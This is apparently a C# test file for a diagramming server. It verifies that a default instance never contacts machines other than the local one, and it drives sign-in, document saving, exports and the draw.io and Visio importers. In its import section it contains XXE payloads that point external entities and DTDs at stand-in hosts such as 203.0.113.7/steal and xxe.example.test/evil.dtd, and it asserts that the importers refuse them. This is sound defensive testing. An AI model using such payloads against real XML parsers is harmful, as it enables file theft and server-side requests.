using System.Net;
using System.Net.Http.Json;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using Draughtsman.Tests.Shared;
using ModelContextProtocol.Client;
using ModelContextProtocol.Protocol;

namespace Draughtsman.Server.Tests;

/// <summary>
/// The air-gap claim, proved at the one place it can be proved from inside the process: a default server (no draughtsman.yaml, so no
/// AI provider, no email, no PDF browser, SQLite) is started with an <see cref="OutboundNetworkObserver"/> already listening to every
/// DNS lookup, TCP connect, HTTP request and TLS handshake the framework announces, is driven through first run, sign-in, create,
/// save, layout, the text exports, the server's own SVG render over MCP, a document thumbnail, the PDF route, the AI routes, a password-reset request, an
/// admin export and the status pages, and is then shut down. Nothing may have been aimed anywhere but this machine.
/// <para>
/// What it does not see: the Node sidecar and Chromium are other processes (<c>scripts/check-offline-bundles.mjs</c> reads the sidecar
/// bundle, and Chromium is off), and the SPA's PNG and SVG export run in the browser (the same script reads the web bundle, and the
/// server's Content-Security-Policy, pinned by SecurityHeadersTests, forbids a request to any other origin).
/// </para>
/// Every guard here must be able to fail: <see cref="The_observer_is_live"/> proves the listener hears real traffic,
/// <see cref="OptInNetworkFeaturesTests"/> proves each feature that does call out is heard when it is switched on, and the
/// classification tests prove an off-machine destination is flagged.
/// </summary>
[Collection(OutboundNetworkCollection.Name)]
public class NoOutboundNetworkTests
{
    [Fact]
    public async Task A_default_server_is_never_pointed_at_anything_but_this_machine()
    {
        using var observer = new OutboundNetworkObserver();
        await AssertObserverIsLive(observer);

        using (var factory = new DraughtsmanServerFactory())
        {
            await ExerciseEverythingADefaultInstanceDoes(factory);
        }

        Assert.True(observer.OffMachine.Count == 0, "A default server reached for another machine:\n" + observer.Describe(observer.OffMachine));
    }

    [Fact]
    public async Task The_observer_is_live()
    {
        using var observer = new OutboundNetworkObserver();

        await AssertObserverIsLive(observer);

        // Loopback is heard but is not "off the machine": a TestServer-free real connection to ourselves must not trip the guard.
        Assert.Empty(observer.OffMachine);
    }

    [Theory]
    [InlineData("localhost", true)]
    [InlineData("LOCALHOST", true)]
    [InlineData("api.localhost", true)]
    [InlineData("127.0.0.1", true)]
    [InlineData("127.9.9.9", true)]
    [InlineData("::1", true)]
    [InlineData("[::1]", true)]
    [InlineData("::ffff:127.0.0.1", true)]
    [InlineData("api.openai.com", false)]
    [InlineData("smtp.example.com", false)]
    [InlineData("203.0.113.7", false)]
    [InlineData("10.0.0.5", false)]
    [InlineData("169.254.169.254", false)]
    [InlineData("2001:db8::1", false)]
    [InlineData("", false)]
    [InlineData("not-localhost.example", false)]
    public void A_name_or_address_is_this_machine_only_when_it_is_loopback(string host, bool thisMachine)
    {
        Assert.Equal(thisMachine, NetworkDestination.IsThisMachine(host));
    }

    [Theory]
    [InlineData("InterNetwork:16:{0,80,127,0,0,1,0,0,0,0,0,0,0,0}", true)]
    [InlineData("InterNetwork:16:{1,187,203,0,113,7,0,0,0,0,0,0,0,0}", false)]
    [InlineData("InterNetwork:16:{1,187,10,0,0,5,0,0,0,0,0,0,0,0}", false)]
    [InlineData("InterNetworkV6:28:{0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0}", true)]
    [InlineData("InterNetworkV6:28:{231,155,0,0,0,0,0,0,0,0,0,0,0,0,0,0,255,255,127,0,0,1,0,0,0,0}", true)]
    [InlineData("InterNetworkV6:28:{1,187,0,0,0,0,32,1,13,184,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0}", false)]
    [InlineData("Unix:110:{47,116,109,112}", true)]
    [InlineData("something unreadable", false)]
    [InlineData("InterNetwork:16:{x,y}", false)]
    [InlineData("InterNetwork:16:{1,2}", false)]
    [InlineData("", false)]
    public void A_socket_address_is_this_machine_only_when_it_is_readable_and_loopback(string address, bool thisMachine)
    {
        Assert.Equal(thisMachine, NetworkDestination.SocketAddressIsThisMachine(address));
    }

    [Fact]
    public void Each_channel_reads_its_own_event_and_flags_the_destination()
    {
        NetworkAttempt? dns = OutboundNetworkObserver.Interpret("System.Net.NameResolution", "ResolutionStart", new Dictionary<string, object?> { ["hostNameOrAddress"] = "api.openai.com" });
        NetworkAttempt? http = OutboundNetworkObserver.Interpret("System.Net.Http", "RequestStart", new Dictionary<string, object?> { ["host"] = "api.anthropic.com", ["port"] = 443 });
        NetworkAttempt? tcp = OutboundNetworkObserver.Interpret("System.Net.Sockets", "ConnectStart", new Dictionary<string, object?> { ["address"] = "InterNetwork:16:{1,187,203,0,113,7,0,0,0,0,0,0,0,0}" });
        NetworkAttempt? tls = OutboundNetworkObserver.Interpret("System.Net.Security", "HandshakeStart", new Dictionary<string, object?> { ["isServer"] = false, ["targetHost"] = "smtp.example.com" });

        Assert.Equal(new NetworkAttempt("dns lookup", "api.openai.com", true), dns);
        Assert.Equal(new NetworkAttempt("http request", "api.anthropic.com:443", true), http);
        Assert.Equal(new NetworkAttempt("tcp connect", "InterNetwork:16:{1,187,203,0,113,7,0,0,0,0,0,0,0,0}", true), tcp);
        Assert.Equal(new NetworkAttempt("tls handshake", "smtp.example.com", true), tls);

        // Our own server's inbound TLS and accepts, and every event that is not the start of a reach, are not attempts.
        Assert.Null(OutboundNetworkObserver.Interpret("System.Net.Security", "HandshakeStart", new Dictionary<string, object?> { ["isServer"] = true, ["targetHost"] = "x" }));
        Assert.Null(OutboundNetworkObserver.Interpret("System.Net.Sockets", "AcceptStart", new Dictionary<string, object?> { ["address"] = "InterNetwork:16:{0,0,203,0,113,7,0,0,0,0,0,0,0,0}" }));
        Assert.Null(OutboundNetworkObserver.Interpret("System.Net.Http", "RequestStop", new Dictionary<string, object?> { ["statusCode"] = 200 }));
        Assert.Null(OutboundNetworkObserver.Interpret("Some.Other.Source", "RequestStart", new Dictionary<string, object?> { ["host"] = "api.openai.com" }));
    }

    /// <summary>Real loopback traffic through the framework's own sockets and HTTP stack must be heard on every channel the guard relies on.</summary>
    internal static async Task AssertObserverIsLive(OutboundNetworkObserver observer)
    {
        var listener = new TcpListener(IPAddress.Loopback, 0);
        listener.Start();
        try
        {
            int port = ((IPEndPoint)listener.LocalEndpoint).Port;
            Task serve = Task.Run(async () =>
            {
                using TcpClient peer = await listener.AcceptTcpClientAsync();
                NetworkStream stream = peer.GetStream();
                _ = await stream.ReadAsync(new byte[4096]);
                await stream.WriteAsync("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"u8.ToArray());
            });

            await Dns.GetHostAddressesAsync("localhost");
            using var http = new HttpClient();
            using HttpResponseMessage response = await http.GetAsync($"http://127.0.0.1:{port}/", CancellationToken.None);
            await serve;

            Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        }
        finally
        {
            listener.Stop();
        }

        IReadOnlyList<NetworkAttempt> heard = observer.Attempts;
        Assert.Contains(heard, a => a.Channel == "dns lookup" && a.Destination == "localhost");
        Assert.Contains(heard, a => a.Channel == "http request" && a.Destination.StartsWith("127.0.0.1:", StringComparison.Ordinal));
        Assert.Contains(heard, a => a.Channel == "tcp connect" && !a.OffMachine);
    }

    /// <summary>The work of a default instance: everything a person or agent does before any optional component is switched on.</summary>
    internal static async Task ExerciseEverythingADefaultInstanceDoes(DraughtsmanServerFactory factory)
    {
        // First run and sign-in: the setup-code gate, Argon2, the cookie, the CSRF pair; then a second sign-in by password.
        HttpClient admin = await factory.CreateAuthenticatedClient();
        HttpClient signedInAgain = await factory.SignIn(AuthTestHelpers.DefaultEmail, AuthTestHelpers.DefaultPassword);
        Assert.Equal(HttpStatusCode.OK, (await signedInAgain.GetAsync("/api/auth/status", CancellationToken.None)).StatusCode);

        // Health, three ways: anonymous, signed in, and the administrator's own status page and About.
        Assert.Equal(HttpStatusCode.OK, (await factory.CreateClient().GetAsync("/api/health", CancellationToken.None)).StatusCode);
        JsonNode health = await (await admin.GetAsync("/api/health", CancellationToken.None)).Json();
        Assert.Equal("ok", health["status"]!.GetValue<string>());
        Assert.False(health["ai"]!["enabled"]!.GetValue<bool>());
        Assert.False(health["export"]!["pdf"]!.GetValue<bool>());
        Assert.Equal("sqlite", health["storage"]!.GetValue<string>());
        foreach (string page in new[] { "/api/admin/status", "/api/about", "/api/theme", "/api/theme/chrome.css", "/api/admin/email", "/api/admin/ai" })
        {
            Assert.Equal(HttpStatusCode.OK, (await admin.GetAsync(page, CancellationToken.None)).StatusCode);
        }

        // Create, read, save, list.
        const string Body = """{"title":"Air-gapped","type":"architecture","nodes":[{"id":"n_a","kind":"service","shape":"rounded","label":"A"},{"id":"n_b","kind":"service","shape":"rounded","label":"B"}],"edges":[{"id":"e_1","kind":"flow","from":{"node":"n_a"},"to":{"node":"n_b"}}]}""";
        using HttpResponseMessage created = await admin.PostAsync("/api/documents", Json(Body), CancellationToken.None);
        Assert.Equal(HttpStatusCode.Created, created.StatusCode);
        JsonNode document = await created.Json();
        string id = document["id"]!.GetValue<string>();
        string etag = created.Headers.ETag!.ToString();

        document["title"] = "Air-gapped, saved";
        using var save = new HttpRequestMessage(HttpMethod.Put, $"/api/documents/{id}") { Content = Json(document.ToJsonString()) };
        save.Headers.TryAddWithoutValidation("If-Match", etag);
        using HttpResponseMessage saved = await admin.SendAsync(save, CancellationToken.None);
        Assert.Equal(HttpStatusCode.OK, saved.StatusCode);
        Assert.Equal(HttpStatusCode.OK, (await admin.GetAsync($"/api/documents/{id}", CancellationToken.None)).StatusCode);
        Assert.Equal(HttpStatusCode.OK, (await admin.GetAsync("/api/documents", CancellationToken.None)).StatusCode);

        // The sidecar lays it out, and the server's own exports print it.
        using HttpResponseMessage laid = await admin.PostAsync("/api/layout", Json(document.ToJsonString()), CancellationToken.None);
        Assert.Equal(HttpStatusCode.OK, laid.StatusCode);
        foreach (string export in new[] { "/api/export/mermaid", "/api/export/dsl" })
        {
            using HttpResponseMessage exported = await admin.PostAsync(export, Json(document.ToJsonString()), CancellationToken.None);
            Assert.Equal(HttpStatusCode.OK, exported.StatusCode);
        }

        // SVG, drawn on the server: an agent's render_document over the real MCP transport (the editor's PNG and SVG export are client side).
        await using McpClient mcp = await McpClient.CreateAsync(
            new HttpClientTransport(new HttpClientTransportOptions { Endpoint = new Uri(admin.BaseAddress!, "/mcp"), TransportMode = HttpTransportMode.StreamableHttp }, admin),
            cancellationToken: CancellationToken.None);
        CallToolResult rendered = await mcp.CallToolAsync("render_document", new Dictionary<string, object?> { ["id"] = id }, cancellationToken: CancellationToken.None);
        string text = Assert.IsType<TextContentBlock>(Assert.Single(rendered.Content)).Text;
        Assert.StartsWith("<svg", JsonDocument.Parse(text).RootElement.GetProperty("svg").GetString(), StringComparison.Ordinal);

        // The Documents page's thumbnail: the same renderer, drawn and served by this process (no browser, nothing fetched).
        using HttpResponseMessage thumbnail = await admin.GetAsync($"/api/documents/{id}/thumbnail", CancellationToken.None);
        Assert.Equal(HttpStatusCode.OK, thumbnail.StatusCode);
        Assert.StartsWith("<svg", await thumbnail.Content.ReadAsStringAsync(CancellationToken.None), StringComparison.Ordinal);

        // draw.io import, the importer that reads XML a stranger wrote. Files that name pictures, links and a stylesheet on other machines are read as
        // text, and files that try to make the reader fetch something (an external entity and an external DTD, by name and by address, and a
        // parameter entity) are refused before anything is resolved: over HTTP (raw body and multipart) and over MCP. Nothing may be dialled.
        foreach (string fixture in new[] { "shapes.drawio", "containers.drawio", "compressed.drawio", "multipage.drawio" })
        {
            using HttpResponseMessage imported = await admin.PostAsync("/api/import/drawio", new StringContent(DrawioFixtures.Read(fixture), Encoding.UTF8, "text/plain"), CancellationToken.None);
            Assert.Equal(HttpStatusCode.OK, imported.StatusCode);
        }

        using (var upload = new MultipartFormDataContent { { new ByteArrayContent(Encoding.UTF8.GetBytes(DrawioFixtures.Read("shapes.drawio"))), "file", "shapes.drawio" } })
        {
            using HttpResponseMessage uploaded = await admin.PostAsync("/api/import/drawio?type=architecture", upload, CancellationToken.None);
            Assert.Equal(HttpStatusCode.OK, uploaded.StatusCode);
        }

        string[] fetchers =
        [
            "<!DOCTYPE x [<!ENTITY e SYSTEM \"http://203.0.113.7/steal\">]><mxfile><diagram name=\"&e;\"/></mxfile>",
            "<!DOCTYPE x SYSTEM \"https://xxe.example.test/evil.dtd\"><mxfile><diagram name=\"x\"/></mxfile>",
            "<!DOCTYPE x [<!ENTITY % remote SYSTEM \"http://203.0.113.7/params.dtd\"> %remote;]><mxfile><diagram name=\"x\"/></mxfile>",
        ];
        foreach (string xxe in fetchers)
        {
            using HttpResponseMessage refused = await admin.PostAsync("/api/import/drawio", new StringContent(xxe, Encoding.UTF8, "text/plain"), CancellationToken.None);
            Assert.Equal(HttpStatusCode.UnprocessableEntity, refused.StatusCode);
        }

        CallToolResult drawio = await mcp.CallToolAsync("create_document",
            new Dictionary<string, object?> { ["title"] = "From draw.io", ["type"] = "flowchart", ["content"] = DrawioFixtures.Read("shapes.drawio"), ["format"] = "drawio" }, cancellationToken: CancellationToken.None);
        Assert.NotEqual(true, drawio.IsError);
        CallToolResult drawioXxe = await mcp.CallToolAsync("create_document",
            new Dictionary<string, object?> { ["title"] = "XXE", ["type"] = "flowchart", ["content"] = fetchers[0], ["format"] = "drawio" }, cancellationToken: CancellationToken.None);
        Assert.True(drawioXxe.IsError);

        // Visio import, the second importer that reads a stranger's file, and the one that unzips it. A .vsdx that names pictures, relationships and entities on other
        // machines is read as text, and a package that tries to make the reader fetch something (an external entity and an external DTD, by name and by address, a
        // parameter entity, an external relationship) is refused or ignored before anything is resolved: over HTTP (raw body and multipart) and over MCP. Nothing may be dialled.
        foreach (byte[] fixture in new[] { VisioFixtures.Shapes(), VisioFixtures.Group(), VisioFixtures.Connectors(), VisioFixtures.MultiPage(), VisioFixtures.MasterLess(), VisioFixtures.Masters() })
        {
            using var visioBody = new ByteArrayContent(fixture);
            visioBody.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            using HttpResponseMessage visioImported = await admin.PostAsync("/api/import/visio", visioBody, CancellationToken.None);
            Assert.Equal(HttpStatusCode.OK, visioImported.StatusCode);
        }

        using (var visioUpload = new MultipartFormDataContent { { new ByteArrayContent(VisioFixtures.Shapes()), "file", "shapes.vsdx" } })
        {
            using HttpResponseMessage visioUploaded = await admin.PostAsync("/api/import/visio?type=architecture", visioUpload, CancellationToken.None);
            Assert.Equal(HttpStatusCode.OK, visioUploaded.StatusCode);
        }

        List<KeyValuePair<string, byte[]>> visioParts = new VisioDocBuilder().Page("P", VisioDocBuilder.Shape(1, 2, 6, 1, 1, "Box")).Parts();
        string[] visioFetchers =
        [
            "<!DOCTYPE x [<!ENTITY e SYSTEM \"http://203.0.113.7/steal\">]><PageContents><Shapes><Shape ID='1'><Text>&e;</Text></Shape></Shapes></PageContents>",
            "<!DOCTYPE x SYSTEM \"https://xxe.example.test/evil.dtd\"><PageContents><Shapes/></PageContents>",
            "<!DOCTYPE x [<!ENTITY % remote SYSTEM \"http://203.0.113.7/params.dtd\"> %remote;]><PageContents><Shapes/></PageContents>",
        ];
        foreach (string xxe in visioFetchers)
        {
            using var hostile = new ByteArrayContent(VisioDocBuilder.Replace(visioParts, "visio/pages/page1.xml", xxe));
            hostile.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            using HttpResponseMessage visioRefused = await admin.PostAsync("/api/import/visio", hostile, CancellationToken.None);
            Assert.Equal(HttpStatusCode.UnprocessableEntity, visioRefused.StatusCode);
        }

        // An external relationship (a link to a part on another machine) is text: it is neither followed nor refused.
        string external = VisioDocBuilder.Relationships(("rId1", "pages", "http://203.0.113.7/pages.xml")).Replace("<Relationship Id='rId1'", "<Relationship TargetMode='External' Id='rId1'", StringComparison.Ordinal);
        using (var externalBody = new ByteArrayContent(VisioDocBuilder.Replace(visioParts, "visio/_rels/document.xml.rels", external)))
        {
            externalBody.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            using HttpResponseMessage visioExternal = await admin.PostAsync("/api/import/visio", externalBody, CancellationToken.None);
            Assert.Equal(HttpStatusCode.OK, visioExternal.StatusCode);
        }

        CallToolResult visio = await mcp.CallToolAsync("create_document",
            new Dictionary<string, object?> { ["title"] = "From Visio", ["type"] = "flowchart", ["content"] = Convert.ToBase64String(VisioFixtures.Connectors()), ["format"] = "visio" }, cancellationToken: CancellationToken.None);
        Assert.NotEqual(true, visio.IsError);
        CallToolResult visioXxe = await mcp.CallToolAsync("create_document",
            new Dictionary<string, object?> { ["title"] = "XXE", ["type"] = "flowchart", ["content"] = Convert.ToBase64String(VisioDocBuilder.Replace(visioParts, "visio/pages/page1.xml", visioFetchers[0])), ["format"] = "visio" }, cancellationToken: CancellationToken.None);
        Assert.True(visioXxe.IsError);

        // The optional components answer "not here" without trying: PDF, AI (both routes), and a "forgot my password" with no mail server set up (hidden: 404).
        Assert.Equal(HttpStatusCode.NotImplemented, (await admin.GetAsync($"/api/documents/{id}/pdf", CancellationToken.None)).StatusCode);
        Assert.Equal(HttpStatusCode.NotFound, (await admin.PostAsync("/api/ai/generate-from-text", Json("""{"description":"a login flow","diagramType":"flowchart"}"""), CancellationToken.None)).StatusCode);
        Assert.Equal(HttpStatusCode.NotFound, (await admin.PostAsync("/api/ai/diagram-to-document", Json($$"""{"documentId":"{{id}}","outputKind":"explanation"}"""), CancellationToken.None)).StatusCode);
        using HttpResponseMessage reset = await factory.CreateClient().RequestReset(AuthTestHelpers.DefaultEmail);
        Assert.Equal(HttpStatusCode.NotFound, reset.StatusCode);

        // An API token, as an agent would use it, and the whole-instance export an administrator takes.
        JsonNode token = await (await admin.PostAsJsonAsync("/api/tokens", new { name = "air-gap probe" }, CancellationToken.None)).Json();
        HttpClient agent = factory.Bearer(token["token"]!.GetValue<string>());
        Assert.Equal(HttpStatusCode.OK, (await agent.GetAsync($"/api/documents/{id}", CancellationToken.None)).StatusCode);
        Assert.Equal(HttpStatusCode.OK, (await admin.GetAsync("/api/admin/export", CancellationToken.None)).StatusCode);

        // Sign out.
        Assert.True((await admin.PostAsync("/api/auth/logout", null, CancellationToken.None)).IsSuccessStatusCode);
    }

    private static StringContent Json(string json)
    {
        return new StringContent(json, Encoding.UTF8, "application/json");
    }
}
